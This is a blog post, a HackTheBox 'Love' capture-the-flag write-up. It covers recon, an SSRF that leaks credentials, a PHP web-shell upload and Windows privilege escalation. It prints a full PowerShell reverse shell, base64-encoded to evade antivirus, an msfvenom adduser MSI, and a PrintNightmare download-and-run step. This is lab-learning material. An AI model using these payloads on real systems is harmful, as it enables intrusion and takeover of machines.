<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Love | Ef's log</title><meta name=keywords content="HackTheBox,Writeup,Cyber Security,Pentesting"><meta name=description content="SSRF in beginner-level"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/love/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Love"><meta property="og:description" content="SSRF in beginner-level"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/love/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/love/imgs/image-20210808233122483.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2021-08-09T05:38:45+07:00"><meta property="article:modified_time" content="2021-08-09T05:38:45+07:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/love/imgs/image-20210808233122483.png"><meta name=twitter:title content="HackTheBox - Love"><meta name=twitter:description content="SSRF in beginner-level"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Love","item":"https://fahmifj.github.io/hackthebox/love/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Love","name":"HackTheBox - Love","description":"SSRF in beginner-level","keywords":["HackTheBox","Writeup","Cyber Security","Pentesting"],"articleBody":"Love from Hack The Box hosts a voting system application and an online file scanner. The file scanner is vulnerable to SSRF, which can be exploited to leak a set of credentials that can be used to login into the voting app. The photo upload functionality can be leveraged to drop a web shell, which is then used to gain interactive shell access on the machine. Enumeration of the system reveals that AlwaysInstallElevated is enabled, and this can be leveraged to install a malicious .msi installer and get SYSTEM access.\nSkills Learned SSRF Abusing Windows AlwaysInstallElevated (Alternative) PrintNightmare LPE Tools Nmap Burp Suite WinPEAS msfvenom Reconnaissance Nmap A full TCP scan scan discovers a bunch of open ports.\n→ kali@kali «love» «10.10.14.51» $ fscan 10.10.10.239 love nmap -p- --min-rate=1000 10.10.10.239 | grep '^[0-9]' | cut -d '/' -f1 | tr '\\n' ',' | sed 's/,$//' nmap -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -sC -sV -oA nmap/10-tcp-allport-love 10.10.10.239 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 11:29 EDT Nmap scan report for 10.10.10.239 Host is up (0.087s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: Voting System using PHP 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 | ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in | Not valid before: 2021-01-18T14:00:16 |_Not valid after: 2022-01-18T14:00:16 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql? | fingerprint-strings: | GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, NULL, NotesRPC, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, WMSRequest, oracle-tns: |_ Host '10.10.14.51' is not allowed to connect to this MariaDB server 5000/tcp open http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: 403 Forbidden 5040/tcp open unknown 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found | ssl-cert: Subject: commonName=LOVE | Subject Alternative Name: DNS:LOVE, DNS:Love | Not valid before: 2021-04-11T14:39:19 |_Not valid after: 2024-04-10T14:39:19 |_ssl-date: 2021-08-08T15:53:52+00:00; +21m37s from scanner time. | tls-alpn: |_ http/1.1 7680/tcp open pando-pub? 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3306-TCP:V=7.91%I=7%D=8/8%Time=610FF878%P=x86_64-pc-linux-gnu%r(NUL SF:L,4A,\"F\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.51'\\x20is\\x20not\\x20allowe ...[SNIP]... Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h06m37s, deviation: 3h30m01s, median: 21m36s | smb-os-discovery: | OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3) | OS CPE: cpe:/o:microsoft:windows_10::- | Computer name: Love | NetBIOS computer name: LOVE\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2021-08-08T08:53:41-07:00 | smb-security-mode: | account_used: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-08-08T15:53:43 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 137.03 seconds Most notable services are:\nAn Apache web server that handles 3 websites on port 80, 443, and 5000 (this one is forbidden). SMB on port 445, good start. A MySQL server on port 3306, I will stay away from this for now because IP block WinRM on 5985/6, I will use this for lateral movement if I have creds. Seeing Apache and MySQL on a Windows host, I can assume that this machine uses XAMPP.\nNmap also identified two hostnames: www.love.htb and staging.love.htb. I will add these to my /etc/hosts.\n→ root@kali «love» «10.10.14.51» $ sudo echo 'www.love.htb staging.love.htb' \u003e\u003e /etc/hosts Enumeration TCP 445 - SMB Anonymous login is not allowed here, I will re-visit this later when I have creds.\n→ root@kali «love» «10.10.14.51» $ smbclient -N -L //10.10.10.239 session setup failed: NT_STATUS_ACCESS_DENIED TCP 5000 Visiting this port results in a 403 Forbidden message error.\nTCP 80 - Website Visiting port 80 with the IP or the hostname returns the same content.\n→ kali@kali «love» «10.10.14.51» $ for i in 10.10.10.239 www.love.htb; do echo -n \"$i \"; curl -s $i | wc -c; done 10.10.10.239 4388 www.love.htb 4388 On the browser, the site displays a login form of a Voting System app.\nTrying some random IDs and common passwords didn’t work here.\nGobuster Gobuster discovers a bunch of directories, but one that stands out is /admin.\n→ kali@kali «love» «10.10.14.51» $ gobuster dir -f -u http://www.love.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -x txt,php -o gobuster/gobuster-S-80 -t 40 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://www.love.htb/ [+] Method: GET [+] Threads: 40 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: txt,php [+] Add Slash: true [+] Timeout: 10s =============================================================== 2021/08/08 13:16:14 Starting gobuster in directory enumeration mode =============================================================== /cgi-bin/ (Status: 403) [Size: 302] /admin/ (Status: 200) [Size: 6198] /includes/ (Status: 200) [Size: 2261] /plugins/ (Status: 200) [Size: 2490] /images/ (Status: 200) [Size: 2719] /logout.php (Status: 302) [Size: 0] [--\u003e index.php] /login.php (Status: 302) [Size: 0] [--\u003e index.php] /webalizer/ (Status: 403) [Size: 302] /home.php (Status: 302) [Size: 0] [--\u003e index.php] /index.php (Status: 200) [Size: 4388] /phpmyadmin/ (Status: 403) [Size: 302] /icons/ (Status: 200) [Size: 74798] /preview.php (Status: 302) [Size: 0] [--\u003e index.php] /examples/ (Status: 503) [Size: 402] /dist/ (Status: 200) [Size: 1389] /tcpdf/ (Status: 200) [Size: 2710] /licenses/ (Status: 403) [Size: 421] /server-status/ (Status: 403) [Size: 421] /con.php (Status: 403) [Size: 302] /con/ (Status: 403) [Size: 302] /con.txt (Status: 403) [Size: 302] /aux/ (Status: 403) [Size: 302] /aux.php (Status: 403) [Size: 302] /aux.txt (Status: 403) [Size: 302] =============================================================== 2021/08/08 13:18:01 Finished =============================================================== /admin When I visit /admin, the page presents the same login form. But this time, instead of voter’s ID, it uses username.\nSubmitting several credentials only reveals that admin is a valid username here.\nTCP 80 - staging.love.htb On staging.love.htb, the site provides an online file scanner.\nThe “Demo” menu points to /beta.php, and it allows visitor to insert a URL there.\nWhile having my netcat listener in listening mode, I entered my HTB IP there, and my listener received the following request.\n→ kali@kali «love» «10.10.14.51» $ nc -nvlp 80 listening on [any] 80 ... connect to [10.10.14.51] from (UNKNOWN) [10.10.10.239] 49806 GET /iamf HTTP/1.1 Host: 10.10.14.51 Accept: */* Based on the received request, I’m guessing the request was crafted using PHP curl. If the user agent contains “WindowsPowerShell”, I’m going to use Responder to see if I can steal the NTLMv2 response.\nPlaying a bit with it reveals that it can render HTML.\nThe key take away from here is that staging.love.htb/beta.php can make a HTTP request.\nTCP 443 - Website On HTTPS, the SSL certificate leaks an email address and a potential username: roy@love.htb.\nAnd both the HTTPS versions of www.love.htb and staging.love.htb return the Forbidden message error.\nFoothold Shell as phoebe SSRF The behavior of the file scanner on staging.love.htb making a HTTP (not always) request can be abused to access internal resources that previously were inaccessible due to IP restrictions. This attack is often referred as Server-Side Request Forgery (SSRF).\nWhen I submit file:///C:/xampp/apache/conf/extra/httpd-vhosts.conf, it returns the virtual host configuration file.\nThe string “C:/xampp/htdocs/passwordmanager” immediately draws my attention. Based on that config, the service on port 5000 is a password manager, and the access is limited to only allow connections from 127.0.0.1.\nAssuming there is an index file, I try to submit file:///C:/xampp/htdocs/passwordmanager/index.php , and the file is exist.\nNow if I submit file:///C:/xampp/htdocs/passwordmanager/creds.txt, it returns the following:\nAlternatively, I can just visit http://127.0.0.1:5000/ and the file scanner will render the page of password manager, in which contains the admin credentials.\nI can use that creds to access the admin dashboard.\nPHP webshell On admin/voters.php, there is a photo upload feature.\nI will intercept the request to modify the photo section to a PHP web shell and then send it afterwards. It gets uploaded smoothly.\nWhen I reload the page, I see the voter I added is there with broken photo, and that because it loads my PHP web shell as image.\nThe uploaded web shell is accessible at http://www.love.htb/images/shell.php, and now I have code execution as phoebe.\nInteractive shell access To get an interactive shell I will use a PowerShell one-liner reverse shell.\n→ kali@kali «love» «10.10.14.51» $ cat exploits/revshell.ps1 $client = New-Object System.Net.Sockets.TCPClient('10.10.14.51',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u003e\u00261 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '\u003e ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() Because it is a Windows machine, I will encoded it with base64 to avoid AV.\n→ kali@kali «love» «10.10.14.51» $ cat exploits/revshell.ps1| iconv -t UTF-16LE| base64 -w0 JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAxACcALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA= I will setup a listener and leverage the web shell to execute my payload.\nhttp://www.love.htb/images/shell.php?f=powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAxACcALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA= On my listener.\n→ kali@kali «love» «10.10.14.51» $ rlwrap nc -nvlp 53 listening on [any] 53 ... connect to [10.10.14.51] from (UNKNOWN) [10.10.10.239] 49950 PS C:\\xampp\\htdocs\\omrs\\images\u003e The user flag is done here.\nPS C:\\Users\\Phoebe\\Desktop\u003e dir Directory: C:\\Users\\Phoebe\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 8/8/2021 3:50 AM 34 user.txt PS C:\\Users\\Phoebe\\Desktop\u003e type user.txt 65a5...[SNIP]... The flag also accessible using SSRF.\nPrivilege Escalation Shell as SYSTEM Enumeration WinPEAS finds that AlwaysInstallElevated is set to 1. This means installation of an app always runs in elevated mode (SYSTEM), and it can be abused to install a malicious .msi package.\n[+] Checking AlwaysInstallElevated [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated AlwaysInstallElevated set to 1 in HKLM! AlwaysInstallElevated set to 1 in HKCU! Exploitation - Malicious .msi Installer I will generate a malicious .msi that will add a user with administrative access using msfvenom\n→ kali@kali «exploits» «10.10.14.51» $ msfvenom -p windows/adduser USER=iamf PASS=P@ssword123! -f msi -o iamf.msi [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 270 bytes Final size of msi file: 159744 bytes Saved as: iamf.msi I will host the .msi using Python web server.\nOn Love, I will grab the msi and install the package immediately.\nPS C:\\Users\\Public\u003e curl.exe -O 10.10.14.53/iamf.msi PS C:\\Users\\Public\u003e msiexec /quiet /qn /i iamf.msi PS C:\\Users\\Public\u003e net user User accounts for \\\\LOVE ------------------------------------------------------------------------------- Administrator DefaultAccount Guest iamf Phoebe WDAGUtilityAccount The command completed successfully. PS C:\\Users\\Public\u003e Psexec - SYSTEM I can login using my backdoor user with help of psexec.py.\n→ root@kali «exploits» «10.10.14.49» $ psexec.py love/iamf:'P@ssword123!'@10.10.10.239 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Requesting shares on 10.10.10.239..... [*] Found writable share ADMIN$ [*] Uploading file VlzRTIEE.exe [*] Opening SVCManager on 10.10.10.239..... [*] Creating service lRbn on 10.10.10.239..... [*] Starting service lRbn..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.19042.867] (c) 2020 Microsoft Corporation. All rights reserved. C:\\WINDOWS\\system32\u003ewhoami nt authority\\system C:\\WINDOWS\\system32\u003ehostname love (Alternative) PrintNightmare Love also vulnerable to LPE PrintNightmare.\nPS C:\\Users\\Phoebe\\Downloads\u003e Get-Service -name spooler Status Name DisplayName ------ ---- ----------- Running spooler Print Spooler PS C:\\Users\\Phoebe\\Downloads\u003e curl.exe -O 10.10.14.51/CVE-2021-1675.ps1 PS C:\\Users\\Phoebe\\Downloads\u003e Import-Module .\\CVE-2021-1675.ps1 PS C:\\Users\\Phoebe\\Downloads\u003e Invoke-Nightmare PS C:\\Users\\Phoebe\\Downloads\u003e net user User accounts for \\\\LOVE ------------------------------------------------------------------------------- adm1n Administrator DefaultAccount Guest iamf Phoebe WDAGUtilityAccount The command completed successfully. I can login via WinRM.\n→ kali@kali «love» «10.10.14.51» $ evil-winrm -i 10.10.10.239 -u 'adm1n' -p'P@ssw0rd' Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\adm1n\\Documents\u003e hostname Love ","wordCount":"1922","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/love/imgs/image-20210808233122483.png","datePublished":"2021-08-09T05:38:45+07:00","dateModified":"2021-08-09T05:38:45+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/love/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Love</h1><p class=post-description>SSRF in beginner-level</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>August 09, 2021</span>&nbsp;&#183;&nbsp;<span class=meta-read>10 min read</span></div><hr></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-445---smb aria-label="TCP 445 - SMB">TCP 445 - SMB</a></li><li><a href=#tcp-5000 aria-label="TCP 5000">TCP 5000</a></li><li><a href=#tcp-80---website aria-label="TCP 80 - Website">TCP 80 - Website</a></li><li><a href=#tcp-80---staginglovehtb aria-label="TCP 80 - staging.love.htb">TCP 80 - staging.love.htb</a></li><li><a href=#tcp-443---website aria-label="TCP 443 - Website">TCP 443 - Website</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-phoebe aria-label="Shell as phoebe">Shell as phoebe</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-system aria-label="Shell as SYSTEM">Shell as SYSTEM</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/love/imgs/image-20210808233122483_hu727ff1d4503f263eaded15fb35069518_154959_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/love/imgs/image-20210808233122483_hu727ff1d4503f263eaded15fb35069518_154959_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/love/imgs/image-20210808233122483_hu727ff1d4503f263eaded15fb35069518_154959_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/love/imgs/image-20210808233122483.png 736w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/love/imgs/image-20210808233122483.png alt width=736 height=468></figure><p>Love from Hack The Box hosts a voting system application and an online file scanner. The file scanner is vulnerable to SSRF, which can be exploited to leak a set of credentials that can be used to login into the voting app. The photo upload functionality can be leveraged to drop a web shell, which is then used to gain interactive shell access on the machine. Enumeration of the system reveals that <code>AlwaysInstallElevated</code> is enabled, and this can be leveraged to install a malicious <code>.msi</code> installer and get SYSTEM access.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>SSRF</li><li>Abusing Windows <strong>AlwaysInstallElevated</strong></li><li>(Alternative) PrintNightmare LPE</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Nmap</li><li>Burp Suite</li><li>WinPEAS</li><li>msfvenom</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p>A full TCP scan scan discovers a bunch of open ports.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «love» «10.10.14.51» 
</span></span><span class=line><span class=cl>$ fscan 10.10.10.239 love
</span></span><span class=line><span class=cl>nmap -p- --min-rate<span class=o>=</span><span class=m>1000</span> 10.10.10.239 <span class=p>|</span> grep <span class=s1>&#39;^[0-9]&#39;</span> <span class=p>|</span> cut -d <span class=s1>&#39;/&#39;</span> -f1 <span class=p>|</span> tr <span class=s1>&#39;\n&#39;</span> <span class=s1>&#39;,&#39;</span> <span class=p>|</span> sed <span class=s1>&#39;s/,$//&#39;</span>
</span></span><span class=line><span class=cl>nmap -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -sC -sV -oA nmap/10-tcp-allport-love 10.10.10.239
</span></span><span class=line><span class=cl>Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-08-08 11:29 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.239
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.087s latency<span class=o>)</span>.
